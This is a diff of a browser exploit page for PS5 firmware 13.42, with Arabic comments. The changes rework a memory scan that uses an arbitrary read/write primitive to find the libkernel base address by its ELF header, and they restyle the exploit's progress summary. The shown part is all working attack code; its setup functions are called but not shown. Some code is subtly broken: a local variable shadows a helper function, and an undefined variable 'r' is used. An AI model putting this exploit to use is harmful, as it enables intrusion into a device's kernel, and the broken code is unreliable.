+        log("s1","💎","Base = "+addr(gLibkernelBase),"ok","DATA");
+        // تحقق: اقرأ 4 بايت تالية للتأكد من ELF
+        var ehdr=arwRead8(addr);
+        log("s1","💎","ELF header = "+hex(ehdr),"ok","DATA");
+        setBox("s1","ok");
+        showSummary();
+      }else{
+        nextRange();
+      }
+    });
+  }
+  nextRange();
+}
+
+// مسح سريع: خطوة 1MB للبحث الأولي، ثم 4KB للتأكيد
+function fastScanRange(start,end,cb){
+  var coarseStep=0x100000n; // 1MB
+  var fineStep=0x1000n;     // 4KB
+  var addr=start;
+  var chunkSize=0x4000000n; // 64MB per batch (للـ UI responsiveness)
+  var batchEnd=addr+chunkSize;
+  if(batchEnd>end)batchEnd=end;
+
+  function doBatch(){
+    if(scanAbort){cb(false,0n);return}
+    var batchStart=performance.now();
+    while(addr<batchEnd){
       try{
         var val=arwRead8(addr);
-        if((val&0xffffffffn)===0x464c457fn){ // \x7fELF
-          gLibkernelBase=addr;
-          found=true;
-          log("s1","✅","libkernel base found!","ok","FOUND");
-          log("s1","💎","Base = "+addr(gLibkernelBase),"ok","DATA");
-          log("s1","💎","ELF Magic = "+hex(val),"ok","DATA");
-          showSummary();
-          return;
+        if((val&0xffffffffn)===0x464c457fn){
+          // Found candidate — verify with fine scan backwards up to 1MB
+          var fineStart=addr>coarseStep?addr-coarseStep:addr;
+          for(var f=fineStart;f<=addr;f+=fineStep){
+            try{
+              var v2=arwRead8(f);
+              if((v2&0xffffffffn)===0x464c457fn){
+                scanAbort=true;
+                cb(true,f);
+                return;
+              }
+            }catch(_){}
+          }
         }
       }catch(_){}
-      progress++;
-      if(progress%0x10000===0){
-        log("s1","⏳","تقدم... "+addr(addr),"info","PROG");
-      }
+      addr+=coarseStep;
+    }
+    // Progress
+    var pct=Number((addr-start)*100n/(end-start));
+    log("s1","⏳","تقدم "+r.name+": "+num(pct.toFixed(1))+"%","info","PROG");
+
+    if(addr>=end){
+      cb(false,0n);
+    }else{
+      batchEnd=addr+chunkSize;
+      if(batchEnd>end)batchEnd=end;
+      // Yield to browser every 64MB
+      setTimeout(doBatch,10);
     }
   }
-
-  if(!found){
-    log("s1","❌","لم يُعثر على libkernel في كل النطاقات","fail","FAIL");
-    setBox("s1","fail");
-    showSummary();
-  }
+  doBatch();
 }
 
 // ═══════════════════════════════════════════════════════════════════
 //  Summary
 // ═══════════════════════════════════════════════════════════════════
 function showSummary(){
-  setBox("summary","ok");
   var box=$("out-summary");
   var s="";
-  s+='<div class="log-line"><span class="badge ok">✓</span> <span>ARW Bootstrap</span></div>';
-  s+='<div class="log-line"><span class="badge ok">✓</span> <span>Read/Write Arbitrary مؤكد</span></div>';
+  s+='<div class="summary-row"><span class="badge ok">✓</span> <span>ARW Bootstrap</span></div>';
+  s+='<div class="summary-row"><span class="badge ok">✓</span> <span>Read/Write Arbitrary</span></div>';
   if(gLibkernelBase!==0n){
-    s+='<div class="log-line"><span class="badge ok">✓</span> <span>libkernel base = '+addr(gLibkernelBase)+'</span></div>';
+    s+='<div class="summary-row"><span class="badge ok">✓</span> <span>libkernel base = '+addr(gLibkernelBase)+'</span></div>';
   }else{
-    s+='<div class="log-line"><span class="badge fail">✗</span> <span>libkernel base — غير موجود</span></div>';
+    s+='<div class="summary-row"><span class="badge fail">✗</span> <span>libkernel base — غير موجود</span></div>';
   }
   box.innerHTML=s;
 }
@@ -596,18 +606,19 @@ function showSummary(){
 //  Boot
 // ═══════════════════════════════════════════════════════════════════
 log("s0","🚀","PS5 FW 13.42 Exploit — Stage 0 + Stage 1","info","BOOT");
-log("s0","📋","Drain count = "+num(DRAIN_COUNT),"info","INFO");
+log("s0","📋","Drain="+num(DRAIN_COUNT)+" | Retries="+num(MAX_RETRIES),"info","INFO");
 
 if(typeof BigInt!=="function"||typeof MessageChannel!=="function"||typeof Symbol!=="function"||typeof history==="undefined"||typeof history.replaceState!=="function"){
-  log("s0","❌","المتصفح لا يدعم المتطلبات الأساسية","fail","FAIL");
+  log("s0","❌","المتصفح لا يدعم المتطلبات","fail","FAIL");
 }else{
   try{
     buildAndStoreGraph();
     prepareAddrof();
   }catch(error){
-    log("s0","❌","Setup error: "+error.message,"fail","FAIL");
+    log("s0","❌","Setup: "+error.message,"fail","FAIL");
   }
 }
 </script>
 </body>
 </html>
+
